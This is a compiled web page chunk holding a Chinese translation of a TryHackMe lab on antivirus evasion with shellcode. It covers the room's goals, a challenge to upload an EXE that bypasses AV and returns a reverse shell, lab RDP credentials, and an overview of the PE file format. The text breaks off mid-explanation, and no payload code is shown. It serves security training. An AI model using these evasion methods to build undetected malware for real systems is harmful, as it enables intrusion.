"use strict";(self.webpackChunkdemo=self.webpackChunkdemo||[]).push([[3053],{225:(e,n,s)=>{s.d(n,{A:()=>r});const r=s.p+"assets/images/78dca06d1d1e4249f25734af8082b8be-87a5e8fad7f8a480152d8254996c82ee.png"},239:(e,n,s)=>{s.d(n,{A:()=>r});const r=s.p+"assets/images/cad28e045fd6fec615b04d731aef7f9a-69f1a0e30eee018d50a0ea506790a6b4.png"},939:(e,n,s)=>{s.r(n),s.d(n,{assets:()=>i,contentTitle:()=>x,default:()=>a,frontMatter:()=>c,metadata:()=>r,toc:()=>t});const r=JSON.parse('{"id":"tryhackme/red-teaming/host-evasions/AV Evasion Shellcode - AV \u7ed5\u8fc7\uff1aShellcode","title":"AV Evasion Shellcode - AV \u7ed5\u8fc7\uff1aShellcode","description":"\u5b66\u4e60 shellcode \u7f16\u7801\u3001\u6253\u5305\u3001\u7ed1\u5b9a\u5668\u548c\u52a0\u5bc6\u5668\u3002","source":"@site/docs/tryhackme/red-teaming/host-evasions/AV Evasion Shellcode - AV \u7ed5\u8fc7\uff1aShellcode.md","sourceDirName":"tryhackme/red-teaming/host-evasions","slug":"/tryhackme/red-teaming/host-evasions/AV Evasion Shellcode - AV \u7ed5\u8fc7\uff1aShellcode","permalink":"/PgUp-code.github.io/docs/tryhackme/red-teaming/host-evasions/AV Evasion Shellcode - AV \u7ed5\u8fc7\uff1aShellcode","draft":false,"unlisted":false,"editUrl":"https://github.com/PgUp-code/PgUp-code.github.io/docs/tryhackme/red-teaming/host-evasions/AV Evasion Shellcode - AV \u7ed5\u8fc7\uff1aShellcode.md","tags":[],"version":"current","sidebarPosition":5,"frontMatter":{"sidebar_position":5},"sidebar":"tryhackme","previous":{"title":"Introduction to Antivirus - \u9632\u75c5\u6bd2\u7b80\u4ecb","permalink":"/PgUp-code.github.io/docs/tryhackme/red-teaming/host-evasions/Introduction to Antivirus - \u9632\u75c5\u6bd2\u7b80\u4ecb"},"next":{"title":"Obfuscation Principles - \u6df7\u6dc6\u539f\u5219","permalink":"/PgUp-code.github.io/docs/tryhackme/red-teaming/host-evasions/Obfuscation Principles - \u6df7\u6dc6\u539f\u5219"}}');var l=s(4848),d=s(8453);const c={sidebar_position:5},x=void 0,i={},t=[{value:"Introduction - \u7b80\u4ecb",id:"introduction---\u7b80\u4ecb",level:2},{value:"Challenge - \u6311\u6218",id:"challenge---\u6311\u6218",level:2},{value:"PE Structure - PE \u7ed3\u6784",id:"pe-structure---pe-\u7ed3\u6784",level:2},{value:"\u4ec0\u4e48\u662f PE \u6587\u4ef6\uff1f",id:"\u4ec0\u4e48\u662f-pe-\u6587\u4ef6",level:3},{value:"\u4e3a\u4ec0\u4e48\u6211\u4eec\u9700\u8981\u4e86\u89e3 PE \u7ed3\u6784\uff1f",id:"\u4e3a\u4ec0\u4e48\u6211\u4eec\u9700\u8981\u4e86\u89e3-pe-\u7ed3\u6784",level:3},{value:"PE-Bear",id:"pe-bear",level:3},{value:"Introduction to Shellcode - Shellcode \u7b80\u4ecb",id:"introduction-to-shellcode---shellcode-\u7b80\u4ecb",level:2},{value:"Generate Shellcode - \u751f\u6210 Shellcode",id:"generate-shellcode---\u751f\u6210-shellcode",level:2},{value:"\u4f7f\u7528\u516c\u5171\u5de5\u5177\u751f\u6210 Shellcode",id:"\u4f7f\u7528\u516c\u5171\u5de5\u5177\u751f\u6210-shellcode",level:3},{value:"Shellcode \u6ce8\u5165",id:"shellcode-\u6ce8\u5165",level:3},{value:"\u4ece EXE \u6587\u4ef6\u751f\u6210 Shellcode",id:"\u4ece-exe-\u6587\u4ef6\u751f\u6210-shellcode",level:3},{value:"Staged Payloads - \u5206\u9636\u6bb5\u6709\u6548\u8f7d\u8377",id:"staged-payloads---\u5206\u9636\u6bb5\u6709\u6548\u8f7d\u8377",level:2},{value:"\u65e0\u9636\u6bb5\u8f7d\u8377",id:"\u65e0\u9636\u6bb5\u8f7d\u8377",level:3},{value:"\u5206\u9636\u6bb5\u8f7d\u8377",id:"\u5206\u9636\u6bb5\u8f7d\u8377",level:3},{value:"\u5206\u9636\u6bb5 vs. \u65e0\u9636\u6bb5",id:"\u5206\u9636\u6bb5-vs-\u65e0\u9636\u6bb5",level:3},{value:"Metasploit\u4e2d\u7684\u5206\u9636\u6bb5\u8f7d\u8377",id:"metasploit\u4e2d\u7684\u5206\u9636\u6bb5\u8f7d\u8377",level:3},{value:"\u521b\u5efa\u81ea\u5b9a\u4e49\u5206\u9636\u6bb5\u8f7d\u8377",id:"\u521b\u5efa\u81ea\u5b9a\u4e49\u5206\u9636\u6bb5\u8f7d\u8377",level:3},{value:"\u4f7f\u7528\u6211\u4eec\u7684\u5f15\u5bfc\u7a0b\u5e8f\u8fd0\u884c\u53cd\u5411 shell",id:"\u4f7f\u7528\u6211\u4eec\u7684\u5f15\u5bfc\u7a0b\u5e8f\u8fd0\u884c\u53cd\u5411-shell",level:3},{value:"Introduction to Encoding and Encryption - \u7f16\u7801\u4e0e\u52a0\u5bc6\u7b80\u4ecb",id:"introduction-to-encoding-and-encryption---\u7f16\u7801\u4e0e\u52a0\u5bc6\u7b80\u4ecb",level:2},{value:"\u4ec0\u4e48\u662f\u7f16\u7801\uff1f",id:"\u4ec0\u4e48\u662f\u7f16\u7801",level:3},{value:"\u4ec0\u4e48\u662f\u52a0\u5bc6\uff1f",id:"\u4ec0\u4e48\u662f\u52a0\u5bc6",level:3},{value:"\u4e3a\u4ec0\u4e48\u6211\u4eec\u9700\u8981\u4e86\u89e3\u7f16\u7801\u548c\u52a0\u5bc6\uff1f",id:"\u4e3a\u4ec0\u4e48\u6211\u4eec\u9700\u8981\u4e86\u89e3\u7f16\u7801\u548c\u52a0\u5bc6",level:3},{value:"Shellcode Encoding and Encryption - Shellcode \u7f16\u7801\u4e0e\u52a0\u5bc6",id:"shellcode-encoding-and-encryption---shellcode-\u7f16\u7801\u4e0e\u52a0\u5bc6",level:2},{value:"\u4f7f\u7528 MSFVenom \u8fdb\u884c\u7f16\u7801",id:"\u4f7f\u7528-msfvenom-\u8fdb\u884c\u7f16\u7801",level:3},{value:"\u4f7f\u7528 MSFVenom \u8fdb\u884c\u52a0\u5bc6",id:"\u4f7f\u7528-msfvenom-\u8fdb\u884c\u52a0\u5bc6",level:3},{value:"\u521b\u5efa\u81ea\u5b9a\u4e49\u8f7d\u8377",id:"\u521b\u5efa\u81ea\u5b9a\u4e49\u8f7d\u8377",level:3},{value:"\u7f16\u7801\u5668",id:"\u7f16\u7801\u5668",level:3},{value:"\u81ea\u89e3\u7801\u8f7d\u8377",id:"\u81ea\u89e3\u7801\u8f7d\u8377",level:3},{value:"Packers - \u6253\u5305\u5de5\u5177",id:"packers---\u6253\u5305\u5de5\u5177",level:2},{value:"\u6253\u5305\u4e00\u4e2a\u5e94\u7528\u7a0b\u5e8f",id:"\u6253\u5305\u4e00\u4e2a\u5e94\u7528\u7a0b\u5e8f",level:3},{value:"\u6253\u5305\u5de5\u5177\u4e0e AV",id:"\u6253\u5305\u5de5\u5177\u4e0e-av",level:3},{value:"\u6253\u5305\u6211\u4eec\u7684 shellcode",id:"\u6253\u5305\u6211\u4eec\u7684-shellcode",level:3},{value:"\u90a3\u6211\u4eec\u73b0\u5728\u8be5\u600e\u4e48\u529e\uff1f",id:"\u90a3\u6211\u4eec\u73b0\u5728\u8be5\u600e\u4e48\u529e",level:3},{value:"Binders - \u6346\u7ed1\u5de5\u5177",id:"binders---\u6346\u7ed1\u5de5\u5177",level:2},{value:"\u4f7f\u7528 msfvenom \u8fdb\u884c\u6346\u7ed1",id:"\u4f7f\u7528-msfvenom-\u8fdb\u884c\u6346\u7ed1",level:3},{value:"\u7ed1\u5b9a\u5668\u4e0e AV",id:"\u7ed1\u5b9a\u5668\u4e0e-av",level:3},{value:"Conclusion - \u7ed3\u8bba",id:"conclusion---\u7ed3\u8bba",level:2}];function h(e){const n={a:"a",admonition:"admonition",blockquote:"blockquote",code:"code",h2:"h2",h3:"h3",img:"img",li:"li",ol:"ol",p:"p",pre:"pre",strong:"strong",table:"table",tbody:"tbody",td:"td",th:"th",thead:"thead",tr:"tr",ul:"ul",...(0,d.R)(),...e.components};return(0,l.jsxs)(l.Fragment,{children:[(0,l.jsxs)(n.blockquote,{children:["\n",(0,l.jsx)(n.p,{children:"\u5b66\u4e60 shellcode \u7f16\u7801\u3001\u6253\u5305\u3001\u7ed1\u5b9a\u5668\u548c\u52a0\u5bc6\u5668\u3002"}),"\n",(0,l.jsx)(n.p,{children:(0,l.jsx)(n.a,{href:"https://tryhackme.com/room/avevasionshellcode",children:"TryHackMe | AV Evasion: Shellcode"})}),"\n"]}),"\n",(0,l.jsx)(n.h2,{id:"introduction---\u7b80\u4ecb",children:"Introduction - \u7b80\u4ecb"}),"\n",(0,l.jsx)(n.p,{children:"\u5728\u672c\u8282\u4e2d\uff0c\u6211\u4eec\u5c06\u63a2\u7d22\u5982\u4f55\u6784\u5efa\u548c\u4ea4\u4ed8\u6709\u6548\u8f7d\u8377\uff0c\u91cd\u70b9\u5173\u6ce8\u5982\u4f55\u907f\u514d\u88ab\u5e38\u89c1\u7684 AV \u5f15\u64ce\u68c0\u6d4b\u5230\u3002\u6211\u4eec\u5c06\u8ba8\u8bba\u4f5c\u4e3a\u653b\u51fb\u8005\u53ef\u7528\u7684\u4e0d\u540c\u6280\u672f\uff0c\u5e76\u8ba8\u8bba\u6bcf\u79cd\u6280\u672f\u7684\u4f18\u7f3a\u70b9\u3002"}),"\n",(0,l.jsx)(n.p,{children:(0,l.jsx)(n.strong,{children:"\u76ee\u6807\uff1a"})}),"\n",(0,l.jsxs)(n.ul,{children:["\n",(0,l.jsx)(n.li,{children:"\u5b66\u4e60\u5982\u4f55\u5236\u4f5c shellcode\u3002"}),"\n",(0,l.jsx)(n.li,{children:"\u63a2\u7d22\u5206\u9636\u6bb5\u6709\u6548\u8f7d\u8377\u7684\u4f18\u7f3a\u70b9\u3002"}),"\n",(0,l.jsx)(n.li,{children:"\u521b\u5efa\u9690\u853d\u7684 shellcode\uff0c\u4ee5\u907f\u514d AV \u68c0\u6d4b\u3002"}),"\n"]}),"\n",(0,l.jsx)(n.p,{children:(0,l.jsx)(n.strong,{children:"\u524d\u63d0\u8981\u6c42\uff1a"})}),"\n",(0,l.jsxs)(n.p,{children:["\u5efa\u8bae\u4f60\u5148\u4e86\u89e3\u4e00\u4e9b ",(0,l.jsx)(n.a,{href:"https://tryhackme.com/room/introtoav",children:"\u5173\u4e8e\u9632\u75c5\u6bd2\u8f6f\u4ef6\u7684\u5de5\u4f5c\u539f\u7406"}),"\uff0c\u4ee5\u53ca\u5bf9\u52a0\u5bc6\u548c\u7f16\u7801\u7684\u57fa\u7840\u7406\u89e3\u3002\u867d\u7136\u4e0d\u4e25\u683c\u8981\u6c42\uff0c\u4f46\u5bf9\u57fa\u672c\u6c47\u7f16\u8bed\u8a00\u7684\u4e00\u4e9b\u4e86\u89e3\u4f1a\u6709\u6240\u5e2e\u52a9\u3002\u6b64\u5916\uff0c\u5efa\u8bae\u5bf9\u9605\u8bfb\u4ee3\u7801\u548c\u7406\u89e3\u51fd\u6570\uff08C\u3001C#\uff09\u6709\u4e00\u5b9a\u4e86\u89e3\u3002"]}),"\n",(0,l.jsx)(n.h2,{id:"challenge---\u6311\u6218",children:"Challenge - \u6311\u6218"}),"\n",(0,l.jsxs)(n.p,{children:["\u5728\u8fd9\u4e2a\u6311\u6218\u4e2d\uff0c\u6211\u4eec\u51c6\u5907\u4e86\u4e00\u53f0\u5e26\u6709 Web \u5e94\u7528\u7a0b\u5e8f\u7684 Windows \u673a\u5668\uff0c\u5141\u8bb8\u4f60\u4e0a\u4f20\u4f60\u7684 payload\u3002\u4e00\u65e6\u4e0a\u4f20\uff0cpayload \u4f1a\u88ab AV \u626b\u63cf\u5e76\u5728\u672a\u68c0\u6d4b\u5230\u6076\u610f\u4ee3\u7801\u65f6\u6267\u884c\u3002\u8fd9\u4e2a\u6311\u6218\u7684\u4e3b\u8981\u76ee\u6807\u662f\u7ed5\u8fc7\u5b89\u88c5\u5728\u865a\u62df\u673a\u4e0a\u7684 Antivirus \u8f6f\u4ef6\uff0c\u5e76\u5728\u6587\u4ef6\u7cfb\u7edf\u4e2d\u6355\u83b7 flag\u3002\u4f60\u53ef\u4ee5\u901a\u8fc7\u4e0a\u4f20\u6587\u4ef6\u5230 ",(0,l.jsx)(n.code,{children:"http://10.10.14.106/"}),"\uff0c\u5c1d\u8bd5\u672c\u623f\u95f4\u8ba8\u8bba\u7684\u6240\u6709\u6280\u5de7\u3002"]}),"\n",(0,l.jsx)(n.p,{children:"\u8bb0\u4f4f\u4ee5\u4e0b\u51e0\u70b9\uff1a"}),"\n",(0,l.jsxs)(n.ul,{children:["\n",(0,l.jsx)(n.li,{children:"\u5c1d\u8bd5\u7ed3\u5408\u672c\u623f\u95f4\u8ba8\u8bba\u7684\u4e0d\u540c\u6280\u5de7\u3002"}),"\n",(0,l.jsx)(n.li,{children:"\u7f51\u7ad9\u4ec5\u652f\u6301 EXE \u6587\u4ef6\u3002"}),"\n",(0,l.jsx)(n.li,{children:"\u4e00\u65e6 AV \u626b\u63cf\u4e0a\u4f20\u7684\u6587\u4ef6\u5e76\u4e14\u672a\u68c0\u6d4b\u5230\u6076\u610f\u4ee3\u7801\uff0c\u6587\u4ef6\u5c06\u4f1a\u6267\u884c\u3002\u56e0\u6b64\uff0c\u5982\u679c\u4e00\u5207\u6309\u6b63\u786e\u65b9\u5f0f\u914d\u7f6e\uff0c\u4f60\u5e94\u8be5\u80fd\u591f\u83b7\u5f97\u4e00\u4e2a\u53cd\u5411 shell\u3002"}),"\n"]}),"\n",(0,l.jsx)(n.p,{children:(0,l.jsx)(n.img,{alt:"AV Challenge Web App",src:s(6981).A+"",width:"829",height:"757"})}),"\n",(0,l.jsx)(n.p,{children:"\u4f60\u53ef\u4ee5\u5148\u5ffd\u7565\u6b64\u4efb\u52a1\u4e2d\u7684\u95ee\u9898\uff0c\u4f46\u8bf7\u786e\u4fdd\u5728\u6210\u529f\u7ed5\u8fc7 AV \u5e76\u83b7\u5f97 shell \u540e\u518d\u56de\u5934\u56de\u7b54\u8fd9\u4e9b\u95ee\u9898\u3002"}),"\n",(0,l.jsx)(n.p,{children:"\u5728\u7ee7\u7eed\u5230\u4e0b\u4e00\u90e8\u5206\u4e4b\u524d\uff0c\u5148\u90e8\u7f72\u9644\u5e26\u7684\u865a\u62df\u673a\u4ee5\u8ddf\u8fdb\u672c\u623f\u95f4\u7684\u5185\u5bb9\uff01\u865a\u62df\u673a\u4f1a\u5728\u6d4f\u89c8\u5668\u4e2d\u81ea\u52a8\u90e8\u7f72\uff0c\u5e76\u5e94\u81ea\u52a8\u663e\u793a\u5728\u5206\u5c4f\u89c6\u56fe\u4e2d\u3002\u5982\u679c\u770b\u4e0d\u5230\u865a\u62df\u673a\uff0c\u8bf7\u4f7f\u7528\u9875\u9762\u53f3\u4e0a\u89d2\u7684\u84dd\u8272 \u201cShow Split View\u201d \u6309\u94ae\u3002\u5982\u679c\u4f60\u66f4\u503e\u5411\u4e8e\u901a\u8fc7 RDP \u8fde\u63a5\uff0c\u53ef\u4ee5\u4f7f\u7528\u4ee5\u4e0b\u51ed\u636e\uff1a"}),"\n",(0,l.jsxs)(n.p,{children:[(0,l.jsx)(n.strong,{children:"Username"}),": thm"]}),"\n",(0,l.jsxs)(n.p,{children:[(0,l.jsx)(n.strong,{children:"Password"}),": Password321"]}),"\n",(0,l.jsx)(n.p,{children:"\u90e8\u5206\u4efb\u52a1\u8fd8\u9700\u8981\u4f7f\u7528 AttackBox\uff0c\u8fd9\u4e5f\u662f\u542f\u52a8\u5b83\u7684\u597d\u65f6\u673a\u3002"}),"\n",(0,l.jsx)(n.h2,{id:"pe-structure---pe-\u7ed3\u6784",children:"PE Structure - PE \u7ed3\u6784"}),"\n",(0,l.jsx)(n.p,{children:"\u6b64\u4efb\u52a1\u7a81\u51fa\u5c55\u793a\u4e86 Windows \u53ef\u6267\u884c\u6587\u4ef6 PE \u6570\u636e\u7ed3\u6784\u7684\u4e00\u4e9b\u9ad8\u5c42\u6b21\u6838\u5fc3\u8981\u7d20\u3002"}),"\n",(0,l.jsx)(n.h3,{id:"\u4ec0\u4e48\u662f-pe-\u6587\u4ef6",children:"\u4ec0\u4e48\u662f PE \u6587\u4ef6\uff1f"}),"\n",(0,l.jsx)(n.p,{children:"PE\uff08\u53ef\u79fb\u690d\u6267\u884c\u6587\u4ef6\uff09\u662f Windows \u53ef\u6267\u884c\u6587\u4ef6\u683c\u5f0f\uff0c\u5b83\u662f\u4e00\u79cd\u6570\u636e\u7ed3\u6784\uff0c\u5305\u542b\u4e86\u6587\u4ef6\u4e2d\u6267\u884c\u6240\u9700\u7684\u4fe1\u606f\u3002PE \u7ed3\u6784\u7528\u4e8e\u5728\u78c1\u76d8\u4e0a\u7ec4\u7ec7\u53ef\u6267\u884c\u6587\u4ef6\u4ee3\u7801\u3002Windows \u64cd\u4f5c\u7cfb\u7edf\u7ec4\u4ef6\uff0c\u5982 Windows \u52a0\u8f7d\u5668\u548c DOS \u52a0\u8f7d\u5668\uff0c\u53ef\u4ee5\u6839\u636e PE \u6587\u4ef6\u4e2d\u89e3\u6790\u51fa\u7684\u4fe1\u606f\u5c06\u6587\u4ef6\u52a0\u8f7d\u5230\u5185\u5b58\u5e76\u6267\u884c\u3002"}),"\n",(0,l.jsx)(n.p,{children:"\u4e00\u822c\u6765\u8bf4\uff0cWindows \u4e8c\u8fdb\u5236\u6587\u4ef6\uff08\u5982 EXE\u3001DLL \u548c\u76ee\u6807\u4ee3\u7801\u6587\u4ef6\uff09\u7684\u9ed8\u8ba4\u6587\u4ef6\u7ed3\u6784\u662f\u76f8\u540c\u7684 PE \u7ed3\u6784\uff0c\u9002\u7528\u4e8e Windows \u64cd\u4f5c\u7cfb\u7edf\uff0c\u65e0\u8bba\u662f x86 \u8fd8\u662f x64 CPU \u67b6\u6784\u3002"}),"\n",(0,l.jsxs)(n.p,{children:["PE \u7ed3\u6784\u5305\u542b\u591a\u4e2a\u90e8\u5206\uff0c\u8fd9\u4e9b\u90e8\u5206\u4fdd\u5b58\u7740\u5173\u4e8e\u4e8c\u8fdb\u5236\u6587\u4ef6\u7684\u4fe1\u606f\uff0c\u5982\u5143\u6570\u636e\u548c\u6307\u5411\u5916\u90e8\u5e93\u5185\u5b58\u5730\u5740\u7684\u94fe\u63a5\u3002PE \u7ed3\u6784\u7684\u4e00\u4e2a\u90e8\u5206\u662f ",(0,l.jsx)(n.strong,{children:"PE \u5934"}),"\uff0c\u5b83\u5305\u542b\u5143\u6570\u636e\u4fe1\u606f\u3001\u6307\u9488\u548c\u5185\u5b58\u4e2d\u5730\u5740\u90e8\u5206\u7684\u94fe\u63a5\u3002\u53e6\u4e00\u4e2a\u90e8\u5206\u662f ",(0,l.jsx)(n.strong,{children:"\u6570\u636e\u6bb5"}),"\uff0c\u5b83\u5305\u542b\u8fd0\u884c\u7a0b\u5e8f\u6240\u9700\u7684\u5bb9\u5668\u4fe1\u606f\uff0c\u8bf8\u5982\u53ef\u6267\u884c\u4ee3\u7801\u3001\u8d44\u6e90\u3001\u5e93\u94fe\u63a5\u3001\u6570\u636e\u53d8\u91cf\u7b49\u3002"]}),"\n",(0,l.jsxs)(n.p,{children:[(0,l.jsx)(n.img,{alt:"PE Structure",src:s(7916).A+"",width:"762",height:"555"}),")"]}),"\n",(0,l.jsxs)(n.ol,{children:["\n",(0,l.jsxs)(n.li,{children:["PE \u7ed3\u6784\u4e2d\u6709\u4e0d\u540c\u7c7b\u578b\u7684\u6570\u636e\u5bb9\u5668\uff0c\u6bcf\u4e2a\u5bb9\u5668\u4fdd\u5b58\u4e0d\u540c\u7684\u6570\u636e\uff1a","\n",(0,l.jsxs)(n.ol,{children:["\n",(0,l.jsxs)(n.li,{children:[(0,l.jsx)(n.strong,{children:".text"}),"\uff1a\u5b58\u50a8\u7a0b\u5e8f\u7684\u5b9e\u9645\u4ee3\u7801\u3002"]}),"\n",(0,l.jsxs)(n.li,{children:[(0,l.jsx)(n.strong,{children:".data"}),"\uff1a\u4fdd\u5b58\u5df2\u521d\u59cb\u5316\u548c\u5df2\u5b9a\u4e49\u7684\u53d8\u91cf\u3002"]}),"\n",(0,l.jsxs)(n.li,{children:[(0,l.jsx)(n.strong,{children:".bss"}),"\uff1a\u5b58\u50a8\u672a\u521d\u59cb\u5316\u7684\u6570\u636e\uff08\u58f0\u660e\u7684\u53d8\u91cf\u6ca1\u6709\u8d4b\u503c\uff09\u3002"]}),"\n",(0,l.jsxs)(n.li,{children:[(0,l.jsx)(n.strong,{children:".rdata"}),"\uff1a\u5305\u542b\u53ea\u8bfb\u6570\u636e\u3002"]}),"\n",(0,l.jsxs)(n.li,{children:[(0,l.jsx)(n.strong,{children:".edata"}),"\uff1a\u5305\u542b\u53ef\u5bfc\u51fa\u7684\u5bf9\u8c61\u548c\u76f8\u5173\u7684\u8868\u4fe1\u606f\u3002"]}),"\n",(0,l.jsxs)(n.li,{children:[(0,l.jsx)(n.strong,{children:".idata"}),"\uff1a\u5305\u542b\u5bfc\u5165\u7684\u5bf9\u8c61\u548c\u76f8\u5173\u7684\u8868\u4fe1\u606f\u3002"]}),"\n",(0,l.jsxs)(n.li,{children:[(0,l.jsx)(n.strong,{children:".reloc"}),"\uff1a\u5305\u542b\u56fe\u50cf\u91cd\u5b9a\u4f4d\u4fe1\u606f\u3002"]}),"\n",(0,l.jsxs)(n.li,{children:[(0,l.jsx)(n.strong,{children:".rsrc"}),"\uff1a\u94fe\u63a5\u7a0b\u5e8f\u4f7f\u7528\u7684\u5916\u90e8\u8d44\u6e90\uff0c\u5982\u56fe\u50cf\u3001\u56fe\u6807\u3001\u5d4c\u5165\u5f0f\u4e8c\u8fdb\u5236\u6587\u4ef6\u548c\u6e05\u5355\u6587\u4ef6\uff08\u5305\u542b\u5173\u4e8e\u7a0b\u5e8f\u7248\u672c\u3001\u4f5c\u8005\u3001\u516c\u53f8\u548c\u7248\u6743\u7684\u6240\u6709\u4fe1\u606f\uff09\u3002"]}),"\n"]}),"\n"]}),"\n"]}),"\n",(0,l.jsx)(n.p,{children:"PE \u7ed3\u6784\u662f\u4e00\u4e2a\u5e9e\u5927\u4e14\u590d\u6742\u7684\u4e3b\u9898\uff0c\u6211\u4eec\u4e0d\u4f1a\u6df1\u5165\u8ba8\u8bba\u5934\u90e8\u548c\u6570\u636e\u90e8\u5206\u7684\u7ec6\u8282\u3002\u672c\u4efb\u52a1\u63d0\u4f9b\u4e86 PE \u7ed3\u6784\u7684\u9ad8\u5c42\u6982\u8ff0\u3002\u5982\u679c\u4f60\u6709\u5174\u8da3\u6df1\u5165\u4e86\u89e3\u8be5\u4e3b\u9898\uff0c\u5efa\u8bae\u67e5\u770b\u4ee5\u4e0b THM \u8bfe\u7a0b\uff0c\u8fd9\u4e9b\u8bfe\u7a0b\u5bf9\u8be5\u4e3b\u9898\u8fdb\u884c\u4e86\u66f4\u8be6\u7ec6\u7684\u89e3\u91ca\uff1a"}),"\n",(0,l.jsxs)(n.ul,{children:["\n",(0,l.jsx)(n.li,{children:(0,l.jsx)(n.a,{href:"https://tryhackme.com/room/windowsinternals",children:"Windows Internals"})}),"\n",(0,l.jsx)(n.li,{children:"Dissecting PE Headers"}),"\n"]}),"\n",(0,l.jsxs)(n.p,{children:["\u4f60\u4e5f\u53ef\u4ee5\u67e5\u9605 ",(0,l.jsx)(n.a,{href:"https://docs.microsoft.com/en-us/windows/win32/debug/pe-format",children:"Windows PE format"})," \u7684\u5b98\u65b9\u6587\u6863\uff0c\u83b7\u53d6\u66f4\u591a\u5173\u4e8e PE \u7684\u8be6\u7ec6\u4fe1\u606f\u3002"]}),"\n",(0,l.jsx)(n.p,{children:"\u5728\u67e5\u770b PE \u5185\u5bb9\u65f6\uff0c\u6211\u4eec\u4f1a\u770b\u5230\u5b83\u5305\u542b\u8bb8\u591a\u65e0\u6cd5\u76f4\u63a5\u8bfb\u53d6\u7684\u5b57\u8282\u3002\u7136\u800c\uff0c\u8fd9\u4e9b\u5b57\u8282\u5305\u542b\u4e86\u52a0\u8f7d\u7a0b\u5e8f\u8fd0\u884c\u6587\u4ef6\u6240\u9700\u7684\u6240\u6709\u7ec6\u8282\u3002\u4ee5\u4e0b\u662f Windows \u52a0\u8f7d\u7a0b\u5e8f\u8bfb\u53d6\u53ef\u6267\u884c\u6587\u4ef6\u5e76\u5c06\u5176\u4f5c\u4e3a\u8fdb\u7a0b\u8fd0\u884c\u7684\u793a\u4f8b\u6b65\u9aa4\uff1a"}),"\n",(0,l.jsxs)(n.ol,{children:["\n",(0,l.jsxs)(n.li,{children:["\n",(0,l.jsxs)(n.p,{children:[(0,l.jsx)(n.strong,{children:"\u5934\u90e8\u90e8\u5206"}),"\uff1a\u89e3\u6790 DOS \u5934\u3001Windows \u5934\u548c\u53ef\u9009\u5934\uff0c\u63d0\u4f9b\u5173\u4e8e EXE \u6587\u4ef6\u7684\u4fe1\u606f\u3002\u4f8b\u5982\uff1a"]}),"\n",(0,l.jsxs)(n.ul,{children:["\n",(0,l.jsx)(n.li,{children:'\u9b54\u672f\u6570\u5b57\u4ee5 "MZ" \u5f00\u5934\uff0c\u544a\u8bc9\u52a0\u8f7d\u7a0b\u5e8f\u8fd9\u662f\u4e00\u4e2a EXE \u6587\u4ef6\u3002'}),"\n",(0,l.jsx)(n.li,{children:"\u6587\u4ef6\u7b7e\u540d"}),"\n",(0,l.jsx)(n.li,{children:"\u6587\u4ef6\u662f\u4e3a x86 \u8fd8\u662f x64 CPU \u67b6\u6784\u7f16\u8bd1\u7684\u3002"}),"\n",(0,l.jsx)(n.li,{children:"\u521b\u5efa\u65f6\u95f4\u6233\u3002"}),"\n"]}),"\n"]}),"\n",(0,l.jsxs)(n.li,{children:["\n",(0,l.jsxs)(n.p,{children:[(0,l.jsx)(n.strong,{children:"\u89e3\u6790\u8282\u533a\u8868\u7684\u7ec6\u8282"}),"\uff0c\u4f8b\u5982\uff1a"]}),"\n",(0,l.jsxs)(n.ul,{children:["\n",(0,l.jsx)(n.li,{children:"\u6587\u4ef6\u5305\u542b\u7684\u8282\u533a\u6570\u91cf\u3002"}),"\n"]}),"\n"]}),"\n",(0,l.jsxs)(n.li,{children:["\n",(0,l.jsxs)(n.p,{children:[(0,l.jsx)(n.strong,{children:"\u5c06\u6587\u4ef6\u5185\u5bb9\u6620\u5c04\u5230\u5185\u5b58"}),"\uff0c\u57fa\u4e8e\u4ee5\u4e0b\u4fe1\u606f\uff1a"]}),"\n",(0,l.jsxs)(n.ul,{children:["\n",(0,l.jsxs)(n.li,{children:[(0,l.jsx)(n.strong,{children:"\u5165\u53e3\u70b9\u5730\u5740"}),"\u548c",(0,l.jsx)(n.strong,{children:"ImageBase \u7684\u504f\u79fb\u91cf"}),"\u3002"]}),"\n",(0,l.jsxs)(n.li,{children:[(0,l.jsx)(n.strong,{children:"RVA\uff08\u76f8\u5bf9\u865a\u62df\u5730\u5740\uff09"}),"\uff1a\u4e0e ImageBase \u76f8\u5173\u7684\u5730\u5740\u3002"]}),"\n"]}),"\n"]}),"\n",(0,l.jsxs)(n.li,{children:["\n",(0,l.jsxs)(n.p,{children:[(0,l.jsx)(n.strong,{children:"\u52a0\u8f7d\u5bfc\u5165\u3001DLL \u548c\u5176\u4ed6\u5bf9\u8c61"}),"\u5230\u5185\u5b58\u4e2d\u3002"]}),"\n"]}),"\n",(0,l.jsxs)(n.li,{children:["\n",(0,l.jsxs)(n.p,{children:[(0,l.jsx)(n.strong,{children:"\u5b9a\u4f4d\u5165\u53e3\u70b9\u5730\u5740"}),"\u5e76\u6267\u884c\u4e3b\u6267\u884c\u51fd\u6570\u3002"]}),"\n"]}),"\n"]}),"\n",(0,l.jsx)(n.h3,{id:"\u4e3a\u4ec0\u4e48\u6211\u4eec\u9700\u8981\u4e86\u89e3-pe-\u7ed3\u6784",children:"\u4e3a\u4ec0\u4e48\u6211\u4eec\u9700\u8981\u4e86\u89e3 PE \u7ed3\u6784\uff1f"}),"\n",(0,l.jsx)(n.p,{children:"\u4e86\u89e3 PE \u7ed3\u6784\u6709\u51e0\u4e2a\u539f\u56e0\u3002\u9996\u5148\uff0c\u7531\u4e8e\u6211\u4eec\u5c06\u8ba8\u8bba\u6253\u5305\u548c\u89e3\u5305\u7b49\u8bdd\u9898\uff0c\u8fd9\u4e9b\u6280\u672f\u9700\u8981\u8be6\u7ec6\u4e86\u89e3 PE \u7ed3\u6784\u3002"}),"\n",(0,l.jsx)(n.p,{children:"\u53e6\u4e00\u4e2a\u539f\u56e0\u662f\uff0cAV \u8f6f\u4ef6\u548c\u6076\u610f\u8f6f\u4ef6\u5206\u6790\u5e08\u5206\u6790 EXE \u6587\u4ef6\u65f6\uff0c\u4f1a\u57fa\u4e8e PE \u5934\u90e8\u548c\u5176\u4ed6 PE \u8282\u533a\u4e2d\u7684\u4fe1\u606f\u3002\u56e0\u6b64\uff0c\u8981\u521b\u5efa\u6216\u4fee\u6539\u5177\u5907 AV \u7ed5\u8fc7\u80fd\u529b\u7684\u6076\u610f\u8f6f\u4ef6\uff0c\u5e76\u5c06\u5176\u5b9a\u5411\u5230 Windows \u673a\u5668\uff0c\u6211\u4eec\u9700\u8981\u4e86\u89e3 Windows \u53ef\u6267\u884c\u6587\u4ef6\uff08Portable Executable\uff09\u7684\u7ed3\u6784\uff0c\u4ee5\u53ca\u5982\u4f55\u5b58\u50a8\u6076\u610f\u7684 